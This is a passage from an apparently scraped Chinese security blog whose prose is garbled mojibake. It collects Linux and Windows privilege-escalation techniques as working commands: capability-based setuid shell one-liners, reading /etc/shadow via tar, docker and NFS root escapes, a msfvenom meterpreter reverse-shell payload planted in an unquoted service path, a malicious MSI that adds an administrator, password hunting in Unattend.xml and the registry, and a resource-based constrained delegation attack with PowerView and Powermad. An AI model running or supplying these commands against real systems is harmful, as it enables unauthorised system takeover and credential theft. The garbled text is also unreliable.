(ä¸æ˜¾ç¤º^&#x2F;procæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹) capabilitiescapabilities æ˜¯linux2.2åå‡ºç°çš„äº§ç‰©ï¼Œå®ƒçš„å‡ºç°ä¸€å®šç¨‹åº¦ä¸Šå¼¥è¡¥äº†suidè¿™ç§ç²—ç³™çš„æƒé™ç®¡ç†æœºåˆ¶ï¼Œä½†æ˜¯capabilities è‡ªèº«ä¹Ÿæœ‰é€ æˆææƒçš„å®‰å…¨éšæ‚£ ç®€ä»‹capabilities æŠŠrootçš„æƒé™ç»†åˆ†äº†ï¼Œå¯ä»¥åˆ†åˆ«å¯ç”¨æˆ–è€…ç¦ç”¨ã€‚ åœ¨è¿›è¡Œç‰¹æƒæ“ä½œçš„æ—¶å€™ï¼Œå¦‚æœeuidä¸æ˜¯rootï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¼šæ£€æŸ¥æ˜¯å¦å…·æœ‰æ‰§è¡Œç‰¹æƒæ“ä½œçš„å¯¹åº”capabilities ï¼Œå¹¶ä»¥æ­¤ä¸ºå‡­æ®å†³å®šç‰¹æƒæ“ä½œæ˜¯å¦èƒ½è¢«æ‰§è¡Œã€‚ å¦‚ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç‰¹æƒæ“ä½œåŠå…¶å¯¹åº”capabilities æ”¹å˜æ–‡ä»¶çš„æ‰€å±è€…(chown()) CAP_CHOWN å‘è¿›ç¨‹å‘é€ä¿¡å·(kill(), signal()) CAP_KILL æ”¹å˜è¿›ç¨‹çš„uid(setuid(), setreuid(), setresuid()ç­‰) CAP_SETUID traceè¿›ç¨‹(ptrace()) CAP_SYS_PTRACE è®¾ç½®ç³»ç»Ÿæ—¶é—´(settimeofday(), stime()ç­‰) CAP_SYS_TIME å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„DACè®¿é—®é™åˆ¶ CAP_DAC_READ_SEARCH å…³äºcapabilitiesçš„ç®¡ç†å·¥å…·æœ‰å¦‚ä¸‹: getcap setcap capsh filecap getcap ç”¨äºæŸ¥è¯¢capabilitiesï¼Œsetcapç”¨äºè®¾ç½®capabilitiesï¼Œcapshç”¨äºæŸ¥å½“å‰shellè¿›ç¨‹çš„capabilitiesï¼Œfilecapæ—¢èƒ½è®¾ç½®åˆèƒ½æŸ¥è¯¢ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤æœç´¢è®¾ç½®äº†capabilitiesçš„å¯æ‰§è¡Œæ–‡ä»¶ getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null å®æ“é€šè¿‡cap_setuidcap_setuid å¯ä»¥è®¾ç½®å½“å‰ç”¨æˆ·çš„euidï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤é€‰é¡¹æ¥è¿›è¡Œä¸€äº›ææƒã€‚ ä»¥pythonä¸ºä¾‹ æˆ‘ä»¬å‘ç°python3.8 æœ‰cap_setuidæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œææƒ python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; ç±»ä¼¼çš„æœ‰å¾ˆå¤šã€‚ perl perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; gdb gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit php php -r &quot;posix_setuid(0); system(&#39;&#x2F;bin&#x2F;sh&#39;);&quot; python python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; rvim éœ€è¦æ”¯æŒpython3æ¨¡å—ã€‚ rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39; vim éœ€è¦æ”¯æŒpython3æ¨¡å—ã€‚vim --versionæŸ¥è¯¢ï¼Œæ˜¯å¦æ”¯æŒpy3 vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39; é€šè¿‡CAP_DAC_READ_SEARCHcap_dac_read_searchå¯ä»¥ç»•è¿‡æ–‡ä»¶çš„è¯»æƒé™æ£€æŸ¥ä»¥åŠç›®å½•çš„è¯»/æ‰§è¡Œæƒé™çš„æ£€æŸ¥ã€‚ åˆ©ç”¨æ­¤ç‰¹æ€§æˆ‘ä»¬å¯ä»¥è¯»å–ç³»ç»Ÿä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚ å¦‚æœtaræœ‰æ­¤æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤æ¥æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶å†…å®¹ã€‚ tar cvf shadow.tar &#x2F;etc&#x2F;shadow &#x2F;&#x2F;åˆ›å»ºå‹ç¼©æ–‡ä»¶tar -xvf shadow.tar &#x2F;&#x2F;è§£å‹ç¼©cd etc &#x2F;&#x2F;è¿›å…¥è§£å‹ç¼©çš„ç›®å½•chmod +r shadow &#x2F;&#x2F;èµ‹äºˆè¯»æƒé™cat shadow | grep root &#x2F;&#x2F;æŸ¥çœ‹shadowæ–‡ä»¶çš„å†…å®¹ DockerDockerç”¨æˆ·ç»„ææƒå¦‚æœæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªDockerç”¨æˆ·ç»„çš„ç”¨æˆ·æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾åœ°å®Œæˆææƒ é¦–å…ˆæˆ‘ä»¬æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ docker run -v &#x2F;:&#x2F;mnt --rm -it crf_web1 chroot &#x2F;mnt sh ç„¶ååœ¨å…¶ä¸­çš„/etc/passwdä¸­å†™å…¥ä¸€ä¸ªrootæƒé™ç”¨æˆ·ï¼ˆæˆ‘è¿™é‡Œç›´æ¥æ— å¯†ç äº†ï¼‰ ç„¶åé€€å‡ºæ¥ï¼Œç›´æ¥å°è¯• su root2 ææƒæˆåŠŸ NFSNFS æ˜¯ä¸€ä¸ªç”¨æ¥å…±äº«ç›®å½•çš„ä¸œè¥¿ï¼Œä½†è‹¥é…ç½®æƒé™ä¸å½“åˆ™ä¼šå¼•å‘å®‰å…¨é—®é¢˜ no_root_squashæˆ‘ä»¬cat /etc/exports å¦‚æœæœ‰no_root_squashå­—æ ·ï¼Œåˆ™è¯´æ˜rootç”¨æˆ·å°±ä¼šå¯¹å…±äº«ç›®å½•æ‹¥æœ‰è‡³é«˜çš„æƒé™æ§åˆ¶ï¼Œå°±åƒæ˜¯å¯¹æœ¬æœºçš„ç›®å½•æ“ä½œä¸€æ ·ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•æœºå™¨çš„rootåœ¨æ­¤ç›®å½•ä¸Šéƒ½æœ‰æœ€é«˜æƒé™ã€‚ æˆ‘ä»¬åœ¨è·å¾—ä¸€å°æœºå™¨çš„rootæƒé™åï¼Œå¯ä»¥é€šè¿‡nfsåœ¨å¦ä¸€å°ä½æƒé™æœºå™¨ä¸Šå®ç°ææƒ mkdir &#x2F;tmp&#x2F;nfsmount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs å°†æœ¬æœºä¸Šçš„&#x2F;tmp&#x2F;nfs æŒ‚è½½åˆ°å…±äº«ç›®å½•cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;nfs&#x2F;bashchmod u+s &#x2F;tmp&#x2F;nfs&#x2F;bash è®¾ç½®å…±äº«ç›®å½•ä¸Šbashçš„suid å›åˆ°ä½æƒé™æœºï¼Œæ‰§è¡Œ /tmp/bash å®Œæˆææƒ","categories":[],"tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"Windowsææƒæ–¹æ³•æ±‡æ€»","slug":"Windowsææƒ","date":"2021-02-19T09:21:51.308Z","updated":"2021-02-19T08:50:44.681Z","comments":true,"path":"2021/02/19/Windowsææƒ/","link":"","permalink":"http://const27.com/2021/02/19/Windows%E6%8F%90%E6%9D%83/","excerpt":"","text":"æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰å…ˆè¯´å®ç”¨åº¦ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œè€Œä¸”æ¯”è¾ƒçœ‹è„¸ã€‚ Windowsä¸‹æœåŠ¡çš„æƒé™é€šå¸¸æ˜¯SYSTEMã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›¿æ¢æœåŠ¡çš„å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆå¦‚åå¼¹shellï¼‰ï¼Œå³ç›¸å½“äºè·å¾—äº†SYSTEMæƒé™ï¼Œè¾¾åˆ°äº†ææƒçš„ç›®çš„ã€‚æ— å¼•å·æœåŠ¡è·¯å¾„æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚æ‰€è°“æ— å¼•å·æœåŠ¡è·¯å¾„ï¼Œå°±æ˜¯æœåŠ¡å¯åŠ¨ç¨‹åºçš„è·¯å¾„ä¸­åŒ…å«äº†ç©ºæ ¼ä¸”æœªè¢«å¼•å·åŒ…å«èµ·æ¥ã€‚æ¯”å¦‚è¿™æ · C:\\Program Files\\floder1\\service.exe å› ä¸ºç©ºæ ¼çš„å­˜åœ¨ï¼ŒWindowsåœ¨å¯åŠ¨æœåŠ¡æ‰¾å¯»æœåŠ¡å¯åŠ¨é¡¹æ—¶ï¼Œå®ƒä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºè¿›è¡Œå¯åŠ¨é¡¹å¯»æ‰¾ C:\\Program.exeC:\\Program Files\\Some.exeC:\\Program Files\\Some Folder\\Service.exe è¿™å°±ç»™äº†æˆ‘ä»¬æœ‰æœºå¯ä¹˜çš„æœºä¼šï¼šå¦‚æœæˆ‘ä»¬åœ¨æœåŠ¡çš„ä¸Šå±‚ç›®å½•æœ‰å†™å…¥æˆ–å®Œå…¨æ§åˆ¶æƒé™ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨Windowsæœå¯»æœåŠ¡å¯åŠ¨é¡¹çš„æ›´é å‰é¡ºåºä¸Šã€‚ æˆ‘ä»¬ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æœç´¢å“ªäº›æœåŠ¡è·¯å¾„æ²¡æœ‰åŒ…å«å¼•å· wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\\Windows\\\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot; æ‰¾åˆ°ä¸€ä¸ªã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ€è·¯å¯èƒ½å°±æ˜¯åœ¨2345Explorerç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªProtect.exeäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çœ‹çœ‹2345Explorerç›®å½•æˆ‘ä»¬çš„æƒé™å¦‚ä½•ã€‚ å…ˆæ¥ä¸€æ‰‹whoami /all.å‘ç°è‡ªå·±æ˜¯Usersç»„çš„ã€‚ ç„¶åä½¿ç”¨icaclså‘½ä»¤æŸ¥çœ‹åœ¨2345Explorerç›®å½•çš„æƒé™å¦‚ä½• usersç»„æ˜¯å®Œå…¨æ§åˆ¶æƒï¼ˆFï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ç”¨msfvenomæ„é€ ä¸€ä¸ªåå¼¹shellçš„exeã€‚å‘½åä¸ºProtect.exeï¼Œæ”¾å…¥2345Explorerç›®å½•ã€‚æˆ‘è¿™é‡Œéšä¾¿ç¼–ç äº†ä¸€ä¸‹ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http -e x86&#x2F;shikata_ga_nai LHOST&#x3D;192.168.111.129 LPORT&#x3D;10068 -f exe -o Protect.exe ç„¶åæˆ‘ä»¬ç°åœ¨æ˜¯æ²¡æœ‰èƒ½åŠ›é‡å¯æœåŠ¡çš„ã€‚ã€‚åªèƒ½ç­‰ç®¡ç†å‘˜é‡å¯æœåŠ¡æˆ–è€…æœºå­é‡å¯ã€‚ç„¶åå°±æ‹¿åˆ°SYSTEMæƒé™äº†ã€‚ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œè¿™ä¸ªå‘ç‚¹æ˜¯å¦‚æœä¸€ä¸ªæœåŠ¡å¯åŠ¨ååœ¨ä¸€å®šæ—¶é—´å†…æœªä¸ Service Control Manager(SCM) é€šè®¯ï¼Œå°±ä¼šè¢«åœæ­¢ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦åœ¨æ‹¿åˆ°shellååŠæ—¶çš„è½¬ç§»è¿›ç¨‹æˆ–è€…æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ã€‚è½¬ç§»è¿›ç¨‹åœ¨msfä¸­å¾ˆç®€å•ï¼Œmeterpreterä¸­å…ˆç”¨psæŸ¥çœ‹è¿›ç¨‹ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªsystemæƒé™ï¼Œè®°ä½å…¶pidï¼Œç„¶å migrate PID å³å¯å®Œæˆè¿›ç¨‹è¿ç§»ã€‚ ä¸‹é¢æ¥è¯´è¯´é˜²æ²»æ–¹æ³•å§ã€‚è¿›å…¥æ³¨å†Œè¡¨ä¿®æ”¹çª—å£ï¼Œåœ¨ HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services è·¯å¾„ä¸‹æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æœåŠ¡ï¼Œä¿®æ”¹å…¶ImagePathï¼ŒæŠŠè·¯å¾„å‰ååŠ ä¸ªå¼•å·å°±å¯äº†ã€‚ æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable Services ï¼‰åŒæ ·çœ‹è„¸ä¸”è¢«åŠ¨ è¿™ä¸ªæ”»å‡»æ–¹æ³•å¤§è‡´åˆ†ä¸¤ç±»1.æ›¿æ¢æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™ä¸ªæ–¹æ³•è¾ƒä¸ºç®€å•ï¼Œå¦‚æœå¯¹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨ç›®å½•æœ‰ä¿®æ”¹æƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ç¨‹åºæ¥æ›¿æ¢åŸæœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶æœåŠ¡ã€‚è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œè€Œä¸”åŸºæœ¬ä¸Šæ”»å‡»æµç¨‹å’ŒTrusted Service Pathså¦‚å‡ºä¸€è¾™ï¼ŒåŒæ ·ä¹Ÿæ˜¯æ¯”è¾ƒè¢«åŠ¨åœ°ç­‰å¾…é‡å¯æœåŠ¡æ‰èƒ½å¼¹shellï¼Œå°±ä¸å†æ¼”ç¤ºäº†ã€‚2.ä¿®æ”¹æœåŠ¡çš„å±æ€§ã€‚å¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹æœåŠ¡çš„ BINARY_PATH_NAME å±æ€§ï¼ˆè¿™ä¸ªå±æ€§ç”¨äºæŒ‡å‘æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾ç½® BINARY_PATH_NAME çš„å€¼ä¸ºç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åé‡å¯æœåŠ¡æ—¶æˆ‘ä»¬çš„ç³»ç»Ÿå‘½ä»¤ä¼šè¢«æ‰§è¡Œã€‚ å¯¹äºåè€…ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¾å·¥å…·æ¥å¿«é€Ÿæ­ç¤ºå‡ºæˆ‘ä»¬èƒ½ä¿®æ”¹å“ªäº›æœåŠ¡çš„å±æ€§ã€‚è¿™ä¸ªå·¥å…·æˆ‘ä»¬é‡‡ç”¨accesschk.exeï¼Œå®ƒæ˜¯å¾®è½¯äº§å‡ºçš„ï¼ŒåŸºæœ¬ä¸ä¼šæŠ¥æ¯’ã€‚ æˆ‘ä»¬é€šè¿‡è¯¥å·¥å…·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteulaoraccesschk.exe -uwcqv &quot;Users&quot; * &#x2F;accepteulaæ¥æŸ¥çœ‹Usersç»„ï¼ˆæ ¹æ®å®é™…æƒ…å†µæ¥å¡«å“ªä¸ªç»„ï¼‰å¯¹å“ªäº›æœåŠ¡æœ‰å“ªäº›æƒé™ å¦‚æœå¯¹æŸä¸ªæœåŠ¡æœ‰service_all_accessæˆ–è€…ä»¥ä¸‹æƒé™ï¼Œå°±è¯´æ˜èƒ½å¯¹å…¶å±æ€§è¿›è¡Œä¿®æ”¹ã€‚ æ¯”å¦‚æˆ‘ä»¬å¯¹SpooleræœåŠ¡æœ‰service_all_accessæƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿™æ ·åšã€‚é€šè¿‡ä¿®æ”¹å…¶binPathä¸ºæ¶æ„æŒ‡ä»¤ï¼Œç„¶åç­‰å¾…ç®¡ç†å‘˜é‡å¯æœåŠ¡ï¼Œæˆ‘ä»¬çš„æ¶æ„æŒ‡ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚ AlwaysInstallElevatedå¦‚æœwindowså¯ç”¨äº†å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹ [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer]â€œAlwaysInstallElevatedâ€&#x3D;dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer]â€œAlwaysInstallElevatedâ€&#x3D;dword:00000001 é‚£ä¹ˆæ‰€æœ‰msiï¼ˆwindowsåº”ç”¨å®‰è£…ç¨‹åºï¼‰éƒ½ä¼šä»¥SYSTEMæƒé™è¿è¡Œã€‚æ­¤æ—¶å¦‚æœæˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ¶æ„msiç¨‹åºï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„åŒæ—¶éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸ªæ³¨å†Œè¡¨é¡¹ä¸ä¸€å®šæ€»æ˜¯å­˜åœ¨çš„ã€‚ï¼ˆæ¯”å¦‚æˆ‘çš„å®éªŒæœº æˆ‘ä»¬å¯ä»¥é€šè¿‡reg queryæ¥éªŒè¯è¿™ä¸¤æ¡æ³¨å†Œè¡¨é¡¹çš„æƒ…å†µ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevated è‹¥å‡ä¸º1ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆæ¶æ„msiæ¥ææƒ msfvenom -p windows&#x2F;adduser USER&#x3D;rottenadmin PASS&#x3D;P@ssword123! -f msi -o rotten.msi ç„¶åæ‰§è¡Œï¼Œè·å¾—ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚ ä¿¡æ¯æ³„éœ²Unattend.xml sysprep.xmlå’Œsysprep.infæ–‡ä»¶GPP.xml å­˜åœ¨ç€ä¸€å®šä¿¡æ¯æ³„éœ²ï¼Œä»–ä»¬é€šå¸¸å­˜åœ¨äºä»¥ä¸‹è·¯å¾„ C:\\Windows\\Panther\\C:\\Windows\\Panther\\Unattend\\C:\\Windows\\System32\\C:\\Windows\\System32\\sysprep\\ æ‰¾åˆ°åï¼Œæ‰¾åˆ° Unattend.xml æ–‡ä»¶ä¸­çš„ æ ‡ç­¾ã€‚å°±æœ‰å¯èƒ½æ‰¾åˆ°ç”¨æˆ·çš„åŠ å¯†åçš„å¯†ç ã€‚ã€‚ &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount&gt; &lt;Password&gt; &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ&#x3D;&lt;&#x2F;Value&gt; &#x2F;&#x2F;PASSWORD &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt; &lt;&#x2F;Password&gt; &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt; &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt; &lt;Group&gt;Administrators&lt;&#x2F;Group&gt; &lt;Name&gt;Administrator&lt;&#x2F;Name&gt; &lt;&#x2F;LocalAccount&gt; &lt;&#x2F;LocalAccounts&gt;&lt;&#x2F;UserAccounts&gt;ä¸€äº›æ•æ„Ÿæ–‡ä»¶æŸ¥è¯¢æŒ‡ä»¤C:\\Users\\user\\Desktop&gt; dir C:\\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \\*password\\*reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;sreg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»refer:https://xz.aliyun.com/t/7454 åŸç†çš„å‡ ä¸ªç‚¹ï¼š1.S4U2SELF åè®®å¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰é…ç½® TrustedToAuthenticationForDelegation å±æ€§ï¼ˆå³å¼€å¯ä½¿ç”¨ä»»ä½•åè®®è®¤è¯çš„çº¦æŸæ€§å§”æ´¾ï¼‰æ—¶è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„STæ˜¯ä¸å¯è¢«è½¬å‘çš„ã€‚2.åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸»æœº åœ¨è¢«å¦ä¸€å°ä¸»æœºå§”æ´¾è®¿é—®æ—¶ï¼Œåœ¨S4U2PROXYè¿‡ç¨‹ä¸­æäº¤è¿‡æ¥çš„STå¦‚æœå³ä½¿æ˜¯ä¸å¯è½¬å‘çš„ã€‚KDCä¾æ—§ä¼šè¿”å›æœ‰æ•ˆçš„ST2ã€‚3.æ¯ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥åˆ›å»ºè‡³å¤šåä¸ªæœºå™¨è´¦æˆ·ï¼ˆ ç”±MachineAccountQuotaå±æ€§å†³å®š ï¼‰ï¼Œæ¯ä¸ªæœºå™¨è´¦æˆ·è¢«åˆ›å»ºæ—¶éƒ½ä¼šè‡ªåŠ¨æ³¨å†ŒSPN: RestrictedKrbHost/domainå’ŒHOST/domainè¿™ä¸¤ä¸ªSPN æ”»å‡»æµç¨‹:å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸ºA1.é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹Aè®¾ç½®å¯ä»¥ è¢« å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚2.åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ°Açš„ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾3.å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨S4U2SELFåè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘STé€šè¿‡S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—®A cifsæœåŠ¡çš„ST2ã€‚4.ç”¨ST2è®¿é—®Açš„CIFSæœåŠ¡ï¼Œæƒé™è·å¾—ã€‚ å®æ“è¿™ä¸ªæ”»å‡»è¯´ç™½äº†å°±æ˜¯ä¸ªææƒâ€¦ é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸŸæ§æ˜¯å¦æ˜¯win2012ä»¥ä¸Šçš„ä¸»æœºï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½å¼€å¯ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ æˆ‘ä»¬ä½¿ç”¨powersploitä¸‹çš„powerviewè„šæœ¬ã€‚æ‰§è¡Œå‘½ä»¤ get-netdomaincontroller å¯ä»¥è·å¾—åŸŸæ§WINç‰ˆæœ¬ ç„¶åæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹å“ªå°ä¸»æœºæœ‰å†™æƒé™ã€‚å› ä¸ºæ˜¯å®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€ä¹ˆé…ç½®ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ä¸ªæœºå™¨çš„æƒé™ã€‚ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚ æˆ‘ä»¬ä¾æ—§ä½¿ç”¨powerviewã€‚å…ˆè°ƒç”¨Get-DomainUser -Identity username -Properties objectsidæ¥è·å–å½“å‰ç”¨æˆ·SIDç„¶åGet-DomainObjectAcl -Identity ä¸»æœºå | ?&#123;$_.SecurityIdentifier -match &quot;åˆšåˆšå¾—åˆ°çš„SID&quot;&#125; æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ã€‚ å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚å¦‚å›¾çœ‹åˆ°æˆ‘ä»¬å¯¹WIN7è¿›è¡Œæ“ä½œ å¥½çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦åˆ›ç«‹ä¸€ä¸ªæœºå™¨ç”¨æˆ·äº†ã€‚æ ¹æ®ç½‘ä¸Šæœç´¢ç»“æœï¼Œä½¿ç”¨powermadè¿™ä¸ªpsè„šæœ¬å¯ä»¥å¾ˆå¿«æ·çš„åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·ã€‚https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force) å¥½çš„ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯†ç hackï¼Œåä¸ºhacksystemçš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®hacksystemåˆ°WIN7çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹WIN7çš„ msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨powerviewå®ç°ã€‚ $SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot; #è¿™å„¿çš„sidæ˜¯æˆ‘ä»¬åˆ›å»ºçš„#æœºå™¨ç”¨æˆ·#evilsystemçš„sid$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose è‡³äºæœºå™¨è´¦æˆ·SIDæ€ä¹ˆè·å¾—ï¼Œpowerviewä¸‹çš„ get-domiancomputer hacksystemç„¶åä½¿ç”¨Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity æŸ¥çœ‹å§”æ´¾æ˜¯å¦è®¾ç½®æˆåŠŸ Set-DomainObject win7 -Clear 